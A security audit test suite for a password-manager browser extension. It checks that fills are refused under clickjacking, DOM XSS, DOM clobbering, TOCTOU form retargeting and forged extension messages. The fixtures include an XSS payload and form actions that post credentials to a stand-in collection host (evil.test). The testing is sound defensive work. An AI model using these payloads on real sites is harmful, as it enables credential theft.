/* Security audit of the browser extension (content script, login-safety policy,
 * service worker, manifests). Deterministic jsdom / node:vm mocks, no network.
 *
 * Every test name is "SEC-E<n>: <attack>". Tests that assert a defence holds
 * pass. A confirmed weakness is written as the secure behaviour and marked
 * `{ todo }`, so the suite stays green while node:test reports it as TODO.
 */
"use strict";
const { test } = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const path = require("node:path");
const vm = require("node:vm");
const { createPage, EXT } = require("./helpers.cjs");
const { firefoxManifest } = require(path.join(EXT, "build-firefox-manifest.cjs"));

// ---------------------------------------------------------------- content side
const LOGIN_FORM = `<form id="login" action="/session" method="post">
  <input id="user" type="text" name="username" autocomplete="username">
  <input id="pw" type="password" name="password">
  <button id="submit" type="submit">Sign in</button>
</form>`;
const NONCE = "c".repeat(32);
function responder({ choices = null, credential = { username: "alice", password: "s3cret" }, signIn = false, onGet = null, held = {} } = {}) {
  return async request => {
    switch (request.type) {
      case "begin_browser": return { ok: true, grant: "grant-1", session_id: "s1", profile: { name: "Home" }, gesture_nonce: NONCE, gesture_expires_in: 30,
        choices: choices || [{ entry_id: "e1", username: credential.username }] };
      case "begin_gesture_browser": return { ok: true, gesture_nonce: NONCE, gesture_expires_in: 30 };
      case "get_browser": {
        if (onGet) onGet(request);
        held.reply = { ok: true, credential: { ...credential }, sign_in: signIn };
        return held.reply;
      }
      case "validate_browser": case "submit_browser": case "cancel_browser": return { ok: true };
      case "ping": return { ok: true, version: "0.3.3", locked: false };
      default: return null;
    }
  };
}
const TWO = [{ entry_id: "e1", username: "alice", label: "Alice" }, { entry_id: "e2", username: "bob", label: "Bob" }];
async function loaded(options) { const p = createPage(options); p.load(); await p.tick(); return p; }
const done = p => p.window.dispatchEvent(new p.window.Event("pagehide"));
const panelButtons = p => { const root = p.shadows.get(p.panelHost()); return root ? Array.from(root.querySelectorAll("button")) : []; };
function clickPanel(p, text) {
  const b = panelButtons(p).find(x => x.textContent.includes(text));
  if (!b) throw new Error(`no panel button "${text}"`);
  p.trusted(b, "click", { composed: true }, p.impls.MouseEventImpl);
}
const iconButton = (p, host) => p.shadows.get(host).querySelector("button");

test("SEC-E1: page script synthesises a click on the in-page fill button (untrusted event)", async () => {
  const p = await loaded({ html: LOGIN_FORM, respond: responder() });
  const host = p.fieldIcons()[0];
  assert.ok(host, "fill icon rendered");
  assert.equal(host.shadowRoot, null, "the icon lives in a closed shadow root the page cannot open");
  const button = iconButton(p, host);
  // Even a direct (non-trusted) dispatch on the inner button does nothing.
  button.dispatchEvent(new p.window.MouseEvent("click", { bubbles: true, composed: true }));
  host.click();
  await p.tick(6);
  assert.equal(p.sent("begin_browser").length, 0);
  // Control: a real (trusted) click does start the flow.
  p.trusted(button, "click", { composed: true }, p.impls.MouseEventImpl);
  await p.tick(8);
  assert.equal(p.sent("begin_browser").length, 1);
  done(p);
});

test("SEC-E2: clickjacking - the page makes the fill button invisible (opacity:0 !important) and lures a click onto it", async () => {
  const p = await loaded({ html: LOGIN_FORM, respond: responder() });
  const host = p.fieldIcons()[0];
  // Page CSS / script: the host is a plain <span> in the page DOM.
  host.style.setProperty("opacity", "0", "important");
  p.trusted(iconButton(p, host), "click", { composed: true }, p.impls.MouseEventImpl);
  await p.tick(10);
  try {
    assert.equal(p.sent("begin_browser").length, 0, "a click on a button the page has hidden must not start a fill");
    assert.equal(p.document.getElementById("pw").value, "");
    assert.match(p.panelText(), /hid, moved or covered/, "the refusal says why and carries no vault data");
  } finally { done(p); }
});

test("SEC-E2: clickjacking variants - near-transparent, transformed, filtered, clipped, resized, moved offscreen or covered fill buttons are refused", async () => {
  const tamper = {
    "opacity 0.05": host => host.style.setProperty("opacity", "0.05", "important"),
    "visibility": host => host.style.setProperty("visibility", "hidden", "important"),
    "transform": host => host.style.setProperty("transform", "scale(0.01)", "important"),
    "filter": host => host.style.setProperty("filter", "opacity(0)", "important"),
    "clip-path": host => host.style.setProperty("clip-path", "inset(50%)", "important"),
    "mix-blend-mode": host => host.style.setProperty("mix-blend-mode", "multiply", "important"),
    "resized": host => host.style.setProperty("width", "400px", "important"),
    "moved offscreen": host => host.style.setProperty("left", "-500px", "important"),
    "moved under the cursor": host => host.style.setProperty("top", "400px", "important"),
    "reparented": (host, p) => p.document.body.append(host),
    "root opacity": (host, p) => p.document.documentElement.style.setProperty("opacity", "0.5"),
    "covered by a page element": (host, p) => {
      const r = host.getBoundingClientRect();
      const cover = p.document.createElement("div");
      p.document.documentElement.append(cover);
      p.setRect(cover, { left: r.left - 5, top: r.top - 5, width: 40, height: 40 });
    },
  };
  for (const [name, apply] of Object.entries(tamper)) {
    const p = await loaded({ html: LOGIN_FORM, respond: responder() });
    const host = p.fieldIcons()[0];
    apply(host, p);
    p.trusted(iconButton(p, host), "click", { composed: true }, p.impls.MouseEventImpl);
    await p.tick(8);
    try {
      assert.equal(p.sent("begin_browser").length, 0, name);
    } finally { done(p); }
  }
});

test("SEC-E2: a pointer click is hit-tested at its own coordinates; a click point outside the button is refused", async () => {
  const p = await loaded({ html: LOGIN_FORM, respond: responder({ choices: TWO }) });
  const host = p.fieldIcons()[0];
  const r = host.getBoundingClientRect();
  p.trusted(iconButton(p, host), "click", { composed: true, detail: 1, clientX: r.left - 100, clientY: r.top }, p.impls.MouseEventImpl);
  await p.tick(6);
  assert.equal(p.sent("begin_browser").length, 0, "click point outside the host");
  p.trusted(iconButton(p, host), "click", { composed: true, detail: 1, clientX: r.left + 5, clientY: r.top + 5 }, p.impls.MouseEventImpl);
  await p.tick(6);
  assert.equal(p.sent("begin_browser").length, 1, "click point on the host");
  done(p);
});

test("SEC-E2: a single matching account is never released by the icon click alone - the picker asks for a second, explicit click", async () => {
  const p = await loaded({ html: LOGIN_FORM, respond: responder() });
  p.trusted(iconButton(p, p.fieldIcons()[0]), "click", { composed: true }, p.impls.MouseEventImpl);
  await p.tick(8);
  assert.equal(p.sent("begin_browser").length, 1);
  assert.equal(p.sent("get_browser").length, 0, "no release on the icon click");
  assert.equal(p.document.getElementById("pw").value, "");
  assert.match(p.panelText(), /Choose an account/);
  assert.equal(panelButtons(p).filter(b => b.className === "account").length, 1, "the picker shows the one account");
  clickPanel(p, "alice");
  await p.tick(10);
  assert.equal(p.sent("get_browser").length, 1);
  assert.equal(p.document.getElementById("pw").value, "s3cret");
  done(p);
});

test("SEC-E2: the toolbar popup (browser UI, not clickjackable) still fills a single match directly", async () => {
  const p = await loaded({ html: LOGIN_FORM, respond: responder() });
  await p.command("fill_current");
  await p.tick(10);
  assert.equal(p.sent("get_browser").length, 1);
  assert.equal(p.document.getElementById("pw").value, "s3cret");
  done(p);
});

test("SEC-E2: clickjacking the account picker - a picker the page made invisible, moved or covered releases nothing", async () => {
  const tamper = {
    "opacity": host => host.style.setProperty("opacity", "0", "important"),
    "transform": host => host.style.setProperty("transform", "translate(300px, 0)", "important"),
    "moved": host => host.style.setProperty("top", "600px", "important"),
    "covered": (host, p) => {
      const r = host.getBoundingClientRect();
      const cover = p.document.createElement("div");
      p.document.documentElement.append(cover);
      p.setRect(cover, { left: r.left, top: r.top, width: r.width, height: r.height });
    },
  };
  for (const [name, apply] of Object.entries(tamper)) {
    const p = await loaded({ html: LOGIN_FORM, respond: responder({ choices: TWO }) });
    await p.command("fill_current");
    await p.tick(6);
    apply(p.panelHost(), p);
    clickPanel(p, "Bob");
    await p.tick(8);
    try {
      assert.equal(p.sent("get_browser").length, 0, name);
      assert.equal(p.document.getElementById("pw").value, "", name);
      assert.ok(p.sent("cancel_browser").length >= 1, `${name}: the grant is cancelled`);
    } finally { done(p); }
  }
});

test("SEC-E2: in-page hosts are pinned with !important inline styles", async () => {
  const p = await loaded({ html: LOGIN_FORM, respond: responder({ choices: TWO }) });
  const host = p.fieldIcons()[0];
  for (const prop of ["position", "opacity", "visibility", "transform", "filter", "clip-path", "pointer-events", "left", "top", "width", "height"]) {
    assert.equal(host.style.getPropertyPriority(prop), "important", prop);
  }
  await p.command("fill_current");
  await p.tick(6);
  assert.equal(p.panelHost().style.getPropertyPriority("opacity"), "important");
  done(p);
});

test("SEC-E3: page script clicks account-picker entries (untrusted) and reads the picker", async () => {
  const p = await loaded({ html: LOGIN_FORM, respond: responder({ choices: TWO }) });
  await p.command("fill_current");
  await p.tick(6);
  assert.equal(p.panelHost().shadowRoot, null, "picker is a closed shadow root: account names are not readable by the page");
  for (const b of panelButtons(p)) b.dispatchEvent(new p.window.MouseEvent("click", { bubbles: true, composed: true }));
  await p.tick(6);
  assert.equal(p.sent("get_browser").length, 0, "untrusted clicks never release a credential");
  assert.equal(p.document.getElementById("pw").value, "");
  done(p);
});

test("SEC-E4: DOM XSS via vault/broker strings rendered in the in-page picker", async () => {
  const evil = `<img src=x onerror="window.__pwned=1"><script>window.__pwned=2</script>`;
  const p = await loaded({ html: LOGIN_FORM, respond: async r => r.type === "begin_browser"
    ? { ok: true, grant: "g", profile: { name: evil }, gesture_nonce: NONCE, choices: [{ entry_id: "e1", username: evil, label: evil }, { entry_id: "e2", username: "b" }] }
    : responder()(r) });
  await p.command("fill_current");
  await p.tick(6);
  const root = p.shadows.get(p.panelHost());
  assert.equal(root.querySelectorAll("img,script,iframe,object,embed").length, 0, "no markup is parsed from broker strings");
  assert.ok(p.panelText().includes("<img src=x"), "rendered as literal text");
  assert.equal(p.window.__pwned, undefined);
  done(p);
});

test("SEC-E5: overlay hit-testing - a page element covering the password field blocks the fill", async () => {
  const p = await loaded({ html: `${LOGIN_FORM}<div id="overlay"></div>`, respond: responder() });
  const host = p.fieldIcons()[0];
  const pw = p.document.getElementById("pw");
  const r = pw.getBoundingClientRect();
  p.setRect(p.document.getElementById("overlay"), { left: r.left, top: r.top, width: r.width, height: r.height });
  p.trusted(iconButton(p, host), "click", { composed: true }, p.impls.MouseEventImpl);
  await p.tick(6);
  assert.equal(p.sent("begin_browser").length, 0, "covered field: refused before any native call");
  assert.equal(pw.value, "");
  assert.match(p.panelText(), /hidden, covered/);
});

test("SEC-E6: TOCTOU - form action switched to another origin while the account picker is open", async () => {
  const p = await loaded({ html: LOGIN_FORM, respond: responder({ choices: TWO }) });
  await p.command("fill_current");
  await p.tick(6);
  p.document.getElementById("login").setAttribute("action", "https://evil.test/collect");
  clickPanel(p, "Bob");
  await p.tick(8);
  assert.equal(p.sent("get_browser").length, 0, "no release once the form points elsewhere");
  assert.equal(p.document.getElementById("pw").value, "");
  assert.equal(p.document.getElementById("user").value, "");
  done(p);
});

test("SEC-E7: TOCTOU - form action switched while get_browser is in flight; the released credential is dropped", async () => {
  let d;
  const p = await loaded({ html: LOGIN_FORM, respond: responder({ onGet: () => d.getElementById("login").setAttribute("action", "https://evil.test/collect") }) });
  d = p.document;
  await p.command("fill_current");
  await p.tick(10);
  assert.equal(p.sent("get_browser").length, 1);
  assert.equal(d.getElementById("pw").value, "");
  assert.equal(d.getElementById("user").value, "");
  assert.equal(p.sent("validate_browser").length, 0);
  done(p);
});

test("SEC-E8: TOCTOU - a synchronous input handler on the username field retargets the form before the password is written", async () => {
  const p = await loaded({ html: LOGIN_FORM, respond: responder() });
  const d = p.document;
  d.getElementById("user").addEventListener("input", () => d.getElementById("login").setAttribute("action", "https://evil.test/collect"));
  await p.command("fill_current");
  await p.tick(10);
  assert.equal(d.getElementById("pw").value, "", "password not written into a form that now posts cross-origin");
  assert.match(p.panelText(), /changed while filling/);
  done(p);
});

test("SEC-E9: TOCTOU - password field turned into a visible text field (type swap) before release", async () => {
  const p = await loaded({ html: LOGIN_FORM, respond: responder({ choices: TWO }) });
  await p.command("fill_current");
  await p.tick(6);
  p.document.getElementById("pw").type = "text";
  clickPanel(p, "Alice");
  await p.tick(8);
  assert.equal(p.sent("get_browser").length, 0);
  assert.equal(p.document.getElementById("pw").value, "");
  done(p);
});

test("SEC-E10: released password does not linger in the broker reply object after a fill", async () => {
  const held = {};
  const p = await loaded({ html: LOGIN_FORM, respond: responder({ held }) });
  await p.command("fill_current");
  await p.tick(10);
  assert.equal(p.document.getElementById("pw").value, "s3cret");
  assert.equal(held.reply.credential.password, "", "credential.password blanked right after the fill");
  done(p);
});

test("SEC-E11: auto sign-in never clicks a submit button whose formaction posts to another origin", async () => {
  const html = `<form id="login" action="/session" method="post"><input id="user" type="text" autocomplete="username"><input id="pw" type="password">
    <button id="evil" type="submit" formaction="https://evil.test/collect">Sign in</button></form>`;
  const p = await loaded({ html, respond: responder({ signIn: true }) });
  let submitted = 0;
  p.document.getElementById("login").addEventListener("submit", () => submitted++);
  await p.command("fill_current");
  await p.tick(10);
  assert.equal(p.sent("submit_browser").length, 0);
  assert.equal(submitted, 0);
  done(p);
});

test("SEC-E12: credential harvesting via a same-origin form whose only submit button has a cross-origin formaction (HTML injection)", async () => {
  const html = `<form id="login" action="/session" method="post"><input id="user" type="text" autocomplete="username"><input id="pw" type="password">
    <button id="evil" type="submit" formaction="https://evil.test/collect">Sign in</button></form>`;
  const p = await loaded({ html, respond: responder() });
  await p.command("fill_current");
  await p.tick(10);
  try {
    assert.equal(p.sent("begin_browser").length, 0, "a form that the user's next click would post cross-origin must be refused like a cross-origin action");
    assert.equal(p.document.getElementById("pw").value, "");
  } finally { done(p); }
});

test("SEC-E12: every submitter counts - form= associated buttons, image inputs, formtarget, and every snapshot kind", () => {
  const safety = html => { const p = createPage({ html, scripts: ["api.js", "heuristics.js", "login-safety.js"] }); p.load(); return p; };
  const refused = {
    "form= associated button": `<form id="f" action="/s" method="post"><input id="pw" type="password"></form><button form="f" formaction="https://evil.test/c">Go</button>`,
    "input type=submit": `<form id="f" action="/s" method="post"><input id="pw" type="password"><input type="submit" formaction="https://evil.test/c"></form>`,
    "input type=image": `<form id="f" action="/s" method="post"><input id="pw" type="password"><input type="image" alt="go" formaction="https://evil.test/c"></form>`,
    "form= associated image input": `<form id="f" action="/s" method="post"><input id="pw" type="password"></form><input type="image" alt="go" form="f" formaction="https://evil.test/c">`,
    "formtarget _blank": `<form id="f" action="/s" method="post"><input id="pw" type="password"><button formtarget="_blank">Go</button></form>`,
    "formtarget named frame": `<form id="f" action="/s" method="post"><input id="pw" type="password"><button formtarget="other">Go</button></form>`,
    "protocol-relative formaction": `<form id="f" action="/s" method="post"><input id="pw" type="password"><button formaction="//evil.test/c">Go</button></form>`,
    "control named elements (clobbering)": `<form id="f" action="/s" method="post"><input name="elements"><input id="pw" type="password"><button formaction="https://evil.test/c">Go</button></form>`,
  };
  for (const [name, html] of Object.entries(refused)) {
    const p = safety(html);
    assert.equal(p.S().safeForm(p.document.getElementById("f")), false, name);
    assert.throws(() => p.S().snapshot(p.document.getElementById("pw")), /another origin/, name);
  }
  const ok = safety(`<form id="f" action="/s" method="post"><input id="pw" type="password"><button formaction="/alt" formtarget="_self">Go</button><button formaction="">Same</button><input type="button" formaction="https://evil.test/c" value="not a submitter"></form>`);
  assert.equal(ok.S().safeForm(ok.document.getElementById("f")), true, "same-origin formaction, _self target and non-submit buttons are fine");
  const otp = safety(`<form id="f" action="/s" method="post"><input id="code" autocomplete="one-time-code"><button formaction="https://evil.test/c">Verify</button></form>`);
  assert.throws(() => otp.S().otpSnapshot(otp.document.getElementById("code")), /another origin/, "otpSnapshot");
  const card = safety(`<form id="f" action="/s" method="post"><input id="n" autocomplete="cc-number"><button formaction="https://evil.test/c">Pay</button></form>`);
  assert.throws(() => card.S().cardSnapshot(card.document.getElementById("n")), /another origin/, "cardSnapshot");
});

test("SEC-E12: a cross-origin submit button injected after the snapshot makes unchanged() refuse", () => {
  const p = createPage({ html: LOGIN_FORM, scripts: ["api.js", "heuristics.js", "login-safety.js"] });
  p.load();
  const d = p.document;
  const ctx = p.S().snapshot(d.getElementById("pw"));
  assert.equal(p.S().unchanged(ctx), true);
  const evil = d.createElement("button"); evil.setAttribute("formaction", "https://evil.test/c"); evil.setAttribute("form", "login");
  d.body.append(evil);
  assert.equal(p.S().unchanged(ctx), false);
  evil.remove();
  const image = d.createElement("input"); image.type = "image"; image.setAttribute("formtarget", "_blank");
  d.getElementById("login").append(image);
  assert.equal(p.S().unchanged(ctx), false);
});

test("SEC-E12: identity fill refuses a form with a cross-origin submit button", async () => {
  const p = await loaded({ html: `<form action="/profile" method="post"><input id="email" type="email" autocomplete="email"><button formaction="https://evil.test/c">Save</button></form>`,
    respond: async () => ({ ok: true }) });
  await p.command("fill_identity");
  await p.tick(6);
  assert.equal(p.sent("begin_identity_browser").length, 0);
  assert.match(p.panelText(), /another origin/);
});

test("SEC-E13: injected <base href> makes a relative form action post to another origin", () => {
  const p = createPage({ html: `<form id="f" action="/session" method="post"><input id="pw" type="password"></form>`, scripts: ["api.js", "heuristics.js", "login-safety.js"] });
  p.load();
  const d = p.document;
  const base = d.createElement("base"); base.href = "https://evil.test/"; d.head.prepend(base);
  const form = d.getElementById("f");
  assert.equal(new URL(form.action).origin, "https://evil.test", "precondition: the browser would submit to evil.test");
  assert.equal(p.S().safeForm(form), false, "safeForm must judge the URL the browser will actually submit to");
  assert.throws(() => p.S().snapshot(d.getElementById("pw")), /another origin/);
});

test("SEC-E13: a cross-origin <base href> or a non-self <base target> refuses even forms with absolute same-origin actions", () => {
  for (const attrs of [`href="https://evil.test/"`, `target="_blank"`, `target="frame1"`]) {
    const p = createPage({ html: `<form id="f" action="https://example.test/session" method="post"><input id="pw" type="password"></form>`, scripts: ["api.js", "heuristics.js", "login-safety.js"] });
    p.load();
    const d = p.document;
    const base = d.createElement("base");
    for (const [, k, v] of attrs.matchAll(/(\w+)="([^"]*)"/g)) base.setAttribute(k, v);
    d.head.prepend(base);
    assert.equal(p.S().safeForm(d.getElementById("f")), false, attrs);
  }
  const p = createPage({ html: `<form id="f" action="session" method="post"></form>`, scripts: ["api.js", "heuristics.js", "login-safety.js"] });
  p.load();
  const base = p.document.createElement("base"); base.href = "https://example.test/app/"; base.target = "_self"; p.document.head.prepend(base);
  assert.equal(p.S().safeForm(p.document.getElementById("f")), true, "a same-origin base with a _self target is fine");
});

test("SEC-E14: DOM clobbering - <div id=\"__lgk019\"> disables the content script on the page", async () => {
  const p = await loaded({ html: `<div id="__lgk019"></div>${LOGIN_FORM}` });
  assert.equal(p.fieldIcons().length, 1, "a page element must not switch the extension off");
});

test("SEC-E14: DOM clobbering - <div id=\"LGKHeuristics\"> / <div id=\"LGKLoginSafety\"> cannot stand in for the modules", async () => {
  const p = await loaded({ html: `<div id="LGKHeuristics"></div><div id="LGKLoginSafety"></div>${LOGIN_FORM}`, respond: responder() });
  assert.equal(typeof p.H().isSignInLabel, "function");
  assert.equal(typeof p.S().snapshot, "function");
  assert.equal(p.fieldIcons().length, 1);
  await p.command("fill_current");
  await p.tick(10);
  assert.equal(p.document.getElementById("pw").value, "s3cret");
  done(p);
});

test("SEC-E14: the content script still refuses to run twice in one world (re-injection guard)", async () => {
  const p = await loaded({ html: LOGIN_FORM });
  const vmContext = p.dom.getInternalVMContext();
  vm.runInContext(fs.readFileSync(path.join(EXT, "content.js"), "utf8"), vmContext);
  await p.tick();
  assert.equal(p.fieldIcons().length, 1, "no second set of icons");
  assert.equal(p.commandListeners.length, 1, "no second command listener");
});

test("SEC-E15: DOM clobbering - <div id=\"browser\"> replaces the api namespace on Chromium", async () => {
  const p = createPage({ html: `<div id="browser"></div>${LOGIN_FORM}` });
  let error = null;
  try { p.load(); } catch (e) { error = e; }
  await p.tick();
  assert.equal(error, null);
  assert.equal(p.fieldIcons().length, 1);
});

test("SEC-E16: hidden, invisible or offscreen password fields (harvesting forms) get no fill button and are refused", async () => {
  const p = await loaded({ html: `<form action="/s" method="post"><input id="pw" type="password">
      <input id="h1" type="password" style="display:none"><input id="h2" type="password" style="visibility:hidden"><input id="h3" type="password" style="opacity:0"></form>` });
  assert.equal(p.fieldIcons().length, 1, "only the visible field gets a button");
  for (const id of ["h1", "h2", "h3"]) assert.throws(() => p.S().snapshot(p.document.getElementById(id)), /hidden, covered/);
  const offscreen = p.document.createElement("input"); offscreen.type = "password"; p.document.querySelector("form").append(offscreen);
  p.setRect(offscreen, { left: -500, top: -500, width: 200, height: 32 });
  assert.throws(() => p.S().snapshot(offscreen), /hidden, covered/, "offscreen field refused");
});

test("SEC-E16 (info): near-transparent, clipped and zero-size-clipped fields count as hidden", async () => {
  const p = createPage({ html: `<form action="/s" method="post">
      <input id="faint" type="password" style="opacity:0.05">
      <input id="inset" type="password" style="clip-path:inset(50%)">
      <input id="dot" type="password" style="clip-path:circle(0)">
      <div id="box" style="overflow:hidden"><input id="boxed" type="password"></div>
      <input id="fine" type="password" style="opacity:0.5;clip-path:inset(0 round 4px)"></form>` });
  p.setRect(p.document.getElementById("box"), { left: 20, top: 400, width: 0, height: 0 });
  p.load();
  await p.tick();
  const S = p.S();
  for (const id of ["faint", "inset", "dot", "boxed"]) {
    assert.equal(S.visible(p.document.getElementById(id)), false, id);
    assert.throws(() => S.snapshot(p.document.getElementById(id)), /hidden, covered/, id);
  }
  assert.equal(S.visible(p.document.getElementById("fine")), true, "half opacity and a no-op clip-path stay visible");
  assert.equal(p.fieldIcons().length, 1, "only the visible field gets a button");
  // Legacy clip (jsdom does not compute it; the parser is checked directly).
  for (const v of ["rect(0 0 0 0)", "rect(0px, 0px, 0px, 0px)", "rect(1px, 1px, 1px, 1px)", "rect(10px auto 10px auto)"]) assert.equal(S.clipHides(v), true, v);
  for (const v of ["auto", "", "rect(0 100px 30px 0)", "rect(auto auto auto auto)"]) assert.equal(S.clipHides(v), false, v);
  for (const v of ["inset(50%)", "inset(0 60% 0 0)", "circle(0)", "ellipse(0px 0px)"]) assert.equal(S.clipPathHides(v), true, v);
  for (const v of ["none", "", "inset(0)", "inset(2px round 6px)", "circle(50%)"]) assert.equal(S.clipPathHides(v), false, v);
});

test("SEC-E10 (info): a credential released while the page changed (get_browser early return) is blanked too", async () => {
  const held = {};
  let d;
  const p = await loaded({ html: LOGIN_FORM, respond: responder({ held, onGet: () => d.getElementById("login").setAttribute("action", "https://evil.test/collect") }) });
  d = p.document;
  await p.command("fill_current");
  await p.tick(10);
  assert.equal(p.sent("get_browser").length, 1);
  assert.equal(d.getElementById("pw").value, "");
  assert.equal(held.reply.credential.password, "", "password blanked on the early-return path");
  assert.equal(held.reply.credential.username, "");
  done(p);
});

const IDENTITY_FORM = `<form id="profile" action="/profile" method="post"><input id="email" type="email" autocomplete="email"></form>`;
function identityResponder(held, onRelease = null) {
  return async request => {
    switch (request.type) {
      case "begin_identity_browser": return { ok: true, session_id: "s1", profile: { name: "Home" }, choices: [{ entry_id: "i1", revision: 1, title: "Me", fields: ["email", "given_name"] }] };
      case "approve_identity_browser": return { ok: true, approval: "appr-1" };
      case "release_identity_browser":
        if (onRelease) onRelease();
        held.reply = { ok: true, fields: [...request.fields], values: { email: "me@example.test" } };
        held.values = held.reply.values;
        return held.reply;
      case "cancel_identity_browser": return { ok: true };
      default: return null;
    }
  };
}

test("SEC-E10 (info): releaseIdentity blanks the released identity values after the fill", async () => {
  const held = {};
  const p = await loaded({ html: IDENTITY_FORM, respond: identityResponder(held) });
  await p.command("fill_identity");
  await p.tick(6);
  clickPanel(p, "Review and approve");
  await p.tick(10);
  assert.equal(p.document.getElementById("email").value, "me@example.test");
  assert.equal(held.values.email, "", "value blanked after the fill");
  assert.equal(held.reply.values, null);
});

test("SEC-E10 (info): releaseIdentity blanks released values when the page changed during the release", async () => {
  const held = {};
  let d;
  const p = await loaded({ html: IDENTITY_FORM, respond: identityResponder(held, () => d.getElementById("profile").setAttribute("action", "https://evil.test/c")) });
  d = p.document;
  await p.command("fill_identity");
  await p.tick(6);
  clickPanel(p, "Review and approve");
  await p.tick(10);
  assert.equal(p.sent("release_identity_browser").length, 1);
  assert.equal(d.getElementById("email").value, "");
  assert.equal(held.values.email, "", "value blanked on the early-return path");
});

// ---------------------------------------------------------------- service worker
const bgSource = fs.readFileSync(path.join(EXT, "background.js"), "utf8");
const shim = fs.readFileSync(path.join(EXT, "api.js"), "utf8");
const TOP = "https://bank.test/login";
const frame = (url, parentFrameId, documentId, extra = {}) => ({ url, parentFrameId, documentId, documentLifecycle: "active", errorOccurred: false, ...extra });
function sw({ frames = { 0: frame(TOP, -1, "doc-top") }, tab = { active: true, discarded: false }, onNative = null, response = { ok: true } } = {}) {
  let listener; const calls = []; const id = "testextension";
  const chrome = {
    runtime: {
      id, getManifest: () => ({ version: "0.3.3", permissions: [] }), getURL: p => `chrome-extension://${id}/${p}`,
      onMessage: { addListener: f => listener = f },
      sendNativeMessage: async (host, req) => { calls.push(req); if (onNative) await onNative(req); return { ...response }; },
    },
    webNavigation: { getFrame: async ({ frameId }) => frames[frameId], onDOMContentLoaded: { addListener() {} }, onCompleted: { addListener() {} }, onHistoryStateUpdated: { addListener() {} } },
    tabs: { get: async () => tab, sendMessage: () => Promise.resolve() },
  };
  const ctx = vm.createContext({ chrome, URL, Set, Promise, setTimeout, clearTimeout, Uint8Array, btoa, fetch: async () => ({ ok: false }) });
  vm.runInContext(shim, ctx); vm.runInContext(bgSource, ctx);
  const sender = (over = {}) => ({ id, tab: { id: 8 }, frameId: 0, documentId: "doc-top", url: TOP, ...over });
  const send = (req, who = sender()) => new Promise(resolve => listener({ type: "begin_browser", origin: new URL(who.url || TOP).origin, operation_id: "op1", user_gesture: true, ...req }, who, resolve));
  return { calls, send, sender, frames, tab };
}

test("SEC-E17: another extension (foreign sender.id) messages the service worker", async () => {
  const h = sw();
  const r = await h.send({}, h.sender({ id: "evil-extension" }));
  assert.equal(r.error, "untrusted_sender");
  assert.equal(h.calls.length, 0);
});

test("SEC-E18: content-script-supplied origin differs from the browser-reported sender.url", async () => {
  const h = sw({ frames: { 0: frame("https://evil.test/", -1, "doc-top") } });
  const r = await h.send({ origin: "https://bank.test" }, h.sender({ url: "https://evil.test/" }));
  assert.equal(r.error, "origin_mismatch");
  assert.equal(h.calls.length, 0);
});

test("SEC-E19: attacker top page frames the victim login (clickjacking via iframe) - frame-tree walk refuses it", async () => {
  const h = sw({ frames: { 0: frame("https://evil.test/game", -1, "doc-evil"), 4: frame(TOP, 0, "doc-bank") } });
  const r = await h.send({}, h.sender({ frameId: 4, documentId: "doc-bank" }));
  assert.equal(r.error, "destination_changed");
  assert.equal(h.calls.length, 0);
});

test("SEC-E20: frame-tree walk is bounded - a parentFrameId cycle or a very deep chain is refused", async () => {
  const cyc = sw({ frames: { 0: frame(TOP, -1, "doc-top"), 3: frame(TOP, 4, "d3"), 4: frame(TOP, 3, "d4") } });
  assert.equal((await cyc.send({}, cyc.sender({ frameId: 3, documentId: "d3" }))).ok, false);
  const frames = { 0: frame(TOP, -1, "doc-top") };
  for (let i = 1; i <= 40; i++) frames[i] = frame(TOP, i - 1, `d${i}`);
  const deep = sw({ frames });
  assert.equal((await deep.send({}, deep.sender({ frameId: 40, documentId: "d40" }))).ok, false);
  assert.equal(cyc.calls.length + deep.calls.length, 0);
});

test("SEC-E21: public HTTP origin is refused; HTTP is accepted only on loopback", async () => {
  const pub = sw({ frames: { 0: frame("http://bank.test/login", -1, "doc-top") } });
  assert.equal((await pub.send({}, pub.sender({ url: "http://bank.test/login" }))).ok, false);
  assert.equal(pub.calls.length, 0);
  const loop = sw({ frames: { 0: frame("http://127.0.0.1:8000/login", -1, "doc-top") } });
  assert.equal((await loop.send({}, loop.sender({ url: "http://127.0.0.1:8000/login" }))).ok, true);
});

test("SEC-E22: request smuggles action/context/protocol/tab ids - the native payload is rebuilt from browser data only", async () => {
  const h = sw();
  await h.send({ action: "get_browser", context: "forged", protocol: 1, extension_version: "9", tabId: 99, frameId: 0, documentId: "doc-other", password: "x", username: "y" });
  assert.equal(h.calls.length, 1);
  const req = h.calls[0];
  assert.equal(req.action, "begin_browser");
  assert.equal(req.protocol, 2);
  assert.deepEqual(JSON.parse(req.context), [8, "doc-top", "https://bank.test", "op1"]);
  assert.equal(req.password, undefined, "credentials are forwarded only for save/check/capture");
  assert.equal(req.username, undefined);
  for (const k of ["tabId", "frameId", "documentId"]) assert.equal(req[k], undefined);
});

test("SEC-E23: unknown or privileged actions and the popup-only diagnostics path cannot be reached from a page", async () => {
  const h = sw();
  assert.equal((await h.send({ type: "export_vault" })).error, "unsupported_request");
  assert.equal((await h.send({ type: "diagnostics" })).ok, false, "a tab sender never gets the popup diagnostics path");
  const r = await new Promise(resolve => {
    // An extension page other than popup.html, without a tab.
    const h2 = sw();
    h2.send({ type: "diagnostics" }, { id: "testextension", url: "chrome-extension://testextension/other.html" }).then(resolve);
  });
  assert.equal(r.error, "untrusted_sender");
  assert.equal(h.calls.length, 0);
});

test("SEC-E24: prerendered / back-forward-cached documents, background and discarded tabs cannot release", async () => {
  for (const lifecycle of ["prerender", "cached", "pending_deletion"]) {
    const h = sw({ frames: { 0: frame(TOP, -1, "doc-top", { documentLifecycle: lifecycle }) } });
    assert.equal((await h.send({ type: "get_browser", entry_id: "e1", grant: "g" })).ok, false, lifecycle);
    assert.equal(h.calls.length, 0);
  }
  const bg = sw({ tab: { active: false, discarded: false } });
  assert.equal((await bg.send({ type: "get_browser", entry_id: "e1", grant: "g" })).ok, false, "background tab");
  const gone = sw({ tab: { active: true, discarded: true } });
  assert.equal((await gone.send({ type: "get_browser", entry_id: "e1", grant: "g" })).ok, false, "discarded tab");
  assert.equal(bg.calls.length + gone.calls.length, 0);
});

test("SEC-E25: document replaced while the native call is in flight - the credential reply is dropped", async () => {
  const h = sw({ response: { ok: true, credential: { username: "alice", password: "s3cret" } },
    onNative: () => { h.frames[0] = frame(TOP, -1, "doc-new"); } });
  const r = await h.send({ type: "get_browser", entry_id: "e1", grant: "g" });
  assert.equal(h.calls.length, 1);
  assert.equal(r.ok, false);
  assert.equal(r.error, "destination_changed");
  assert.equal(r.credential, undefined);
});

